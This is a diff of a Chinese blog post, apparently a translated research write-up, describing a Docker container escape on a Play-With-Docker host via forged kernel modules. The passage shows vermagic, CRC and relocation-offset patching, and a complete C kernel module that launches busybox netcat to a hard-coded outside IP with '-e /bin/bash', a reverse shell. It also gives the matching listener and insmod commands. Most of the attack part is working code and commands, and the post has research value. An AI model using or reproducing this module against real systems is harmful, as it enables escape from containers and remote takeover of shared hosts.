+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -a ceph.ko | less</span><br><span class="line">...</span><br><span class="line">Relocation section <span class="string">&#x27;.rela.gnu.linkonce.this_module&#x27;</span> at offset 0x8f580 contains 2 entries:</span><br><span class="line">Offset Info Type Sym. Value Sym. Name + Addend</span><br><span class="line">000000000180 052900000001 R_X86_64_64 0000000000000000 init_module + 0</span><br><span class="line">000000000338 04e700000001 R_X86_64_64 0000000000000000 cleanup_module + 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
 <p>init_module的偏移为0x180。接下来查看探针模块init_module的偏移：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -a probing.ko | less</span><br><span class="line">...</span><br><span class="line">Relocation section <span class="string">'.rela.gnu.linkonce.this_module'</span> at offset 0x1bf18 contains 2 entries:</span><br><span class="line">Offset Info Type Sym. Value Sym. Name + Addend</span><br><span class="line">000000000178 002900000001 R_X86_64_64 0000000000000000 init_module + 0</span><br><span class="line">000000000320 002700000001 R_X86_64_64 0000000000000000 cleanup_module + 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -a probing.ko | less</span><br><span class="line">...</span><br><span class="line">Relocation section <span class="string">&#x27;.rela.gnu.linkonce.this_module&#x27;</span> at offset 0x1bf18 contains 2 entries:</span><br><span class="line">Offset Info Type Sym. Value Sym. Name + Addend</span><br><span class="line">000000000178 002900000001 R_X86_64_64 0000000000000000 init_module + 0</span><br><span class="line">000000000320 002700000001 R_X86_64_64 0000000000000000 cleanup_module + 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
 <p>探测模块init_module偏移为0x178，需要对此进行更改，以便目标内核能够执行已安装模块的功能。要解决此问题，我们需要将probing.ko文件上地址0x1bf18的偏移量更改为0x180。<br>使用chngelf（作者自己的工具）进行修改：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chngelf probing.ko 0x1bf18 0x180</span><br></pre></td></tr></table></figure>
+
 <h3 id="Step-5-Load-the-‘Probing’-Module-to-the-Target-Kernel"><a href="#Step-5-Load-the-‘Probing’-Module-to-the-Target-Kernel" class="headerlink" title="Step 5 - Load the ‘Probing’ Module to the Target Kernel"></a>Step 5 - Load the ‘Probing’ Module to the Target Kernel</h3><p>最后一步是将probing.ko模块转移到PWD容器，然后尝试将其加载到内核：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[node1] $ insmod probing.ko</span><br></pre></td></tr></table></figure>
+
 <p>如果加载成功不会有信息输出。接下来使用dmesg获取内核信息：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ dmesg</span><br><span class="line">[1921106.716039] docker_gwbridge: port 67(veth4eff938) entered forwarding state</span><br><span class="line">[1921107.452064] Loading probing module...</span><br><span class="line">[1921107.456852] CRC of call_UserModeHelper = 0xc5fdef94</span><br><span class="line">[1921107.464297] CRC of printk = 0x27e1a049</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-第三阶段-创建反向shell模块"><a href="#0x03-第三阶段-创建反向shell模块" class="headerlink" title="0x03 第三阶段 - 创建反向shell模块"></a>0x03 第三阶段 - 创建反向shell模块</h2><p>对于反向shell，我们使用内核的函数<strong>call_usermodehelper()</strong>，该函数从内核准备并执行用户层应用程序。我们使用一个非常简单的模块：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @file NsEscape.c</span></span><br><span class="line"><span class="comment">* @author Nimrod Stoler, CyberArk Labs</span></span><br><span class="line"><span class="comment">* @date 29 Oct 2018</span></span><br><span class="line"><span class="comment">* @version 0.1</span></span><br><span class="line"><span class="comment">* @brief This loadable kernel module prepares a new device with</span></span><br><span class="line"><span class="comment">* the inode of mnt namespace, which allows a container to</span></span><br><span class="line"><span class="comment">* escape to the host by using enterns or setns()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt; /* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt; /* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;   /* Needed for the macros */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/nsproxy.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_ns.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The license type -- this affects runtime behavior</span></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The author -- visible when you use modinfo</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">"Nimrod Stoler"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The description -- see modinfo</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"NS Escape LKM"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The version of the module</span></span><br><span class="line">MODULE_VERSION(<span class="string">"0.1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">escape_start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">        <span class="string">"SHELL=/bin/bash"</span>,</span><br><span class="line">        <span class="string">"HOME=/home/cyberark"</span>,</span><br><span class="line">        <span class="string">"USER=cyberark"</span>,</span><br><span class="line">        <span class="string">"PATH=/home/cyberark/bin:/home/cyberark/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/cyberark"</span>,</span><br><span class="line">        <span class="string">"DISPLAY=:0"</span>,</span><br><span class="line">        <span class="string">"PWD=/home/cyberark"</span>,</span><br><span class="line">        <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123;<span class="string">"/bin/busybox"</span>, <span class="string">"nc"</span>, <span class="string">"54.87.128.209"</span>, <span class="string">"4444"</span>, <span class="string">"-e"</span>, <span class="string">"/bin/bash"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    rc = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line">    printk(<span class="string">"RC is: %i \n"</span>, rc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">escape_end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_EMERG <span class="string">"Goodbye!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(escape_start);</span><br><span class="line">module_exit(escape_end);</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-第三阶段-创建反向shell模块"><a href="#0x03-第三阶段-创建反向shell模块" class="headerlink" title="0x03 第三阶段 - 创建反向shell模块"></a>0x03 第三阶段 - 创建反向shell模块</h2><p>对于反向shell，我们使用内核的函数**call_usermodehelper()**，该函数从内核准备并执行用户层应用程序。我们使用一个非常简单的模块：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @file NsEscape.c</span></span><br><span class="line"><span class="comment">* @author Nimrod Stoler, CyberArk Labs</span></span><br><span class="line"><span class="comment">* @date 29 Oct 2018</span></span><br><span class="line"><span class="comment">* @version 0.1</span></span><br><span class="line"><span class="comment">* @brief This loadable kernel module prepares a new device with</span></span><br><span class="line"><span class="comment">* the inode of mnt namespace, which allows a container to</span></span><br><span class="line"><span class="comment">* escape to the host by using enterns or setns()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt; /* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt; /* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;   /* Needed for the macros */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/nsproxy.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_ns.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The license type -- this affects runtime behavior</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The author -- visible when you use modinfo</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Nimrod Stoler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The description -- see modinfo</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;NS Escape LKM&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The version of the module</span></span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">escape_start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">        <span class="string">&quot;SHELL=/bin/bash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;HOME=/home/cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;USER=cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=/home/cyberark/bin:/home/cyberark/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;DISPLAY=:0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PWD=/home/cyberark&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;/bin/busybox&quot;</span>, <span class="string">&quot;nc&quot;</span>, <span class="string">&quot;54.87.128.209&quot;</span>, <span class="string">&quot;4444&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    rc = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line">    printk(<span class="string">&quot;RC is: %i \n&quot;</span>, rc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">escape_end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_EMERG <span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(escape_start);</span><br><span class="line">module_exit(escape_end);</span><br></pre></td></tr></table></figure>
+
 <p>该模块调用busybox中的netcat，该busybox已经通过我们的命令安装在主机的文件系统上。<br>接下来，为nsescape代码创建一个Makefile并对其进行编译：</p>
 <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj-m = nsescape.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build/ M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
+
 <p>执行make：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">make -C /lib/modules/4.17.0-rc2/build/ M=/root/cprojects/kernelmod/nsescape modules</span><br><span class="line">make[1]: Entering directory <span class="string">'/root/debian/linux-4.17-rc2'</span></span><br><span class="line">Building modules, stage 2.</span><br><span class="line">MODPOST 1 modules</span><br><span class="line"><span class="built_in">read</span> <span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">make -C /lib/modules/4.17.0-rc2/build/ M=/root/cprojects/kernelmod/nsescape modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/root/debian/linux-4.17-rc2&#x27;</span></span><br><span class="line">Building modules, stage 2.</span><br><span class="line">MODPOST 1 modules</span><br><span class="line"><span class="built_in">read</span> <span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
+
 <p>暂停make过程后，就像对探测模块所做的那样，编辑文件nsescape.mod.c以更改vermagic和CRC：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vermagic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/compiler.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_INFO(vermagic, <span class="string">"4.4.0-96-generic SMP mod_unload modversions "</span>);</span><br><span class="line">MODULE_INFO(name, KBUILD_MODNAME);</span><br><span class="line"></span><br><span class="line">__visible <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(".<span class="title">gnu</span>.<span class="title">linkonce</span>.<span class="title">this_module</span>"))) = &#123;</span></span><br><span class="line">.name = KBUILD_MODNAME,</span><br><span class="line">.init = init_module,</span><br><span class="line">#ifdef CONFIG_MODULE_UNLOAD</span><br><span class="line">.<span class="built_in">exit</span> = cleanup_module,</span><br><span class="line">#endif</span><br><span class="line">.arch = MODULE_ARCH_INIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RETPOLINE</span></span><br><span class="line">MODULE_INFO(retpoline, <span class="string">"Y"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">modversion_info</span> ____<span class="title">versions</span>[]</span></span><br><span class="line"><span class="class">__<span class="title">used</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>("__<span class="title">versions</span>"))) = &#123;</span></span><br><span class="line">&#123; <span class="comment">/*0x6cb06770*/</span> <span class="number">0xfc5ded98</span>, __VMLINUX_SYMBOL_STR(module_layout) &#125;,</span><br><span class="line">&#123; <span class="number">0xdb7305a1</span>, __VMLINUX_SYMBOL_STR(__stack_chk_fail) &#125;,</span><br><span class="line">&#123; <span class="number">0x27e1a049</span>, __VMLINUX_SYMBOL_STR(printk) &#125;,</span><br><span class="line">&#123; <span class="comment">/*0xa7eedcc4*/</span> <span class="number">0xc5fdef94</span>, __VMLINUX_SYMBOL_STR(call_usermodehelper) &#125;,</span><br><span class="line">&#123; <span class="number">0xbdfb6dbb</span>, __VMLINUX_SYMBOL_STR(__fentry__) &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> __module_depends[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">".modinfo"</span>))) =</span><br><span class="line"><span class="string">"depends="</span>;</span><br><span class="line"></span><br><span class="line">MODULE_INFO(srcversion, <span class="string">"E4B73EA24DFD56CAEDF8C67"</span>);</span><br></pre></td></tr></table></figure>
-<p>更改vermagic以匹配目标内核，并更改module_layout和call_usermodhelper的CRC以匹配我们从探测模块获得的数字。其他CRC（printk，<strong> fentry</strong>和__stack_chk_fail）在两个内核之间没有改变。最后，就像使用探测模块一样，使用chngelf实用程序将输出文件中的init_module可重定位偏移量从0x178更改为0x180。<br>最本地运行监听程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vermagic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/compiler.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_INFO(vermagic, <span class="string">&quot;4.4.0-96-generic SMP mod_unload modversions &quot;</span>);</span><br><span class="line">MODULE_INFO(name, KBUILD_MODNAME);</span><br><span class="line"></span><br><span class="line">__visible <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(&quot;.<span class="title">gnu</span>.<span class="title">linkonce</span>.<span class="title">this_module</span>&quot;))) = &#123;</span></span><br><span class="line">.name = KBUILD_MODNAME,</span><br><span class="line">.init = init_module,</span><br><span class="line">#ifdef CONFIG_MODULE_UNLOAD</span><br><span class="line">.<span class="built_in">exit</span> = cleanup_module,</span><br><span class="line">#endif</span><br><span class="line">.arch = MODULE_ARCH_INIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RETPOLINE</span></span><br><span class="line">MODULE_INFO(retpoline, <span class="string">&quot;Y&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">modversion_info</span> ____<span class="title">versions</span>[]</span></span><br><span class="line"><span class="class">__<span class="title">used</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(&quot;__<span class="title">versions</span>&quot;))) = &#123;</span></span><br><span class="line">&#123; <span class="comment">/*0x6cb06770*/</span> <span class="number">0xfc5ded98</span>, __VMLINUX_SYMBOL_STR(module_layout) &#125;,</span><br><span class="line">&#123; <span class="number">0xdb7305a1</span>, __VMLINUX_SYMBOL_STR(__stack_chk_fail) &#125;,</span><br><span class="line">&#123; <span class="number">0x27e1a049</span>, __VMLINUX_SYMBOL_STR(printk) &#125;,</span><br><span class="line">&#123; <span class="comment">/*0xa7eedcc4*/</span> <span class="number">0xc5fdef94</span>, __VMLINUX_SYMBOL_STR(call_usermodehelper) &#125;,</span><br><span class="line">&#123; <span class="number">0xbdfb6dbb</span>, __VMLINUX_SYMBOL_STR(__fentry__) &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> __module_depends[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">&quot;.modinfo&quot;</span>))) =</span><br><span class="line"><span class="string">&quot;depends=&quot;</span>;</span><br><span class="line"></span><br><span class="line">MODULE_INFO(srcversion, <span class="string">&quot;E4B73EA24DFD56CAEDF8C67&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>更改vermagic以匹配目标内核，并更改module_layout和call_usermodhelper的CRC以匹配我们从探测模块获得的数字。其他CRC（printk，__ fentry__和__stack_chk_fail）在两个内核之间没有改变。最后，就像使用探测模块一样，使用chngelf实用程序将输出文件中的init_module可重定位偏移量从0x178更改为0x180。<br>最本地运行监听程序：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc –l 4444 -vvv</span><br></pre></td></tr></table></figure>
+
 <p>远程主机：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[node1] $ insmod nsescape.ko</span><br></pre></td></tr></table></figure>
-      
     </div>
 
     
-
     
-    
-    
-
-    
-
-    
-      
-    
-    
-
     
 
     <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/linux/" rel="tag"># linux</a>
-          
-            <a href="/tags/kernel/" rel="tag"># kernel</a>
-          
-            <a href="/tags/docker/" rel="tag"># docker</a>
-          
-            <a href="/tags/escape/" rel="tag"># escape</a>
-          
-            <a href="/tags/2020/" rel="tag"># 2020</a>
-          
-        </div>
-      
-
-      
-      
-        <div class="post-widgets">
-        
-
-        
-
-        
-          
-          <div class="social_share">
-            
-            
-              <div id="needsharebutton-postbottom">
-                <span class="btn">
-                  <i class="fa fa-share-alt" aria-hidden="true"></i>
-                </span>
-              </div>
-            
-          </div>
-        
-        </div>
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2020/02/11/HackTM2020-TripToTrick/" rel="next" title="HackTM 2020 - TripToTrick WriteUp">
-                <i class="fa fa-chevron-left"></i> HackTM 2020 - TripToTrick WriteUp
-              </a>
-            
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/linux/" rel="tag"># linux</a>
+              <a href="/tags/docker/" rel="tag"># docker</a>
+              <a href="/tags/escape/" rel="tag"># escape</a>
+              <a href="/tags/2020/" rel="tag"># 2020</a>
           </div>
 
-          <span class="post-nav-divider"></span>
+        
 
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/04/03/qemu-image-maker/" rel="prev" title="QEMU & create-image.sh">
-                QEMU & create-image.sh <i class="fa fa-chevron-right"></i>
-              </a>
-            
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/02/11/HackTM2020-TripToTrick/" rel="prev" title="HackTM 2020 - TripToTrick WriteUp">
+                  <i class="fa fa-chevron-left"></i> HackTM 2020 - TripToTrick WriteUp
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/04/03/qemu-image-maker/" rel="next" title="QEMU & create-image.sh">
+                  QEMU & create-image.sh <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
           </div>
-        </div>
-      
-
-      
-      
     </footer>
-  </div>
-  
-  
-  
   </article>
-
-
-  </div>
-
-
-          </div>
-          
-
+  
+  
   
 
 
 
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
       
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
